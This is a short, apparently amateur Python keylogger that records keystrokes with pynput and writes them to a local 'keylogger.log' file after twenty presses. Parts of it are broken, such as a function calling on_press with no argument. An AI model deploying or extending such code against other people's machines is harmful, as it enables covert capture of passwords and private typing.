from pynput import keyboard

events = []
MARKER = 'KEY'
keylogger = 'keylogger.log'

def on_press(key):
    try:
      # ('{0}'.format(key.char))
      events.append(key)
      print(events)
    except AttributeError:
        print('{0}'.format(key))
    if len(events) == 20:
        file = open(keylogger, 'w')
        for i in events:
            file.write(str(i))
        file.close()

def on_handling():
    global events
    on_press()


with keyboard.Listener(on_press = on_press) as listener:
 listener.join()


on_handling()
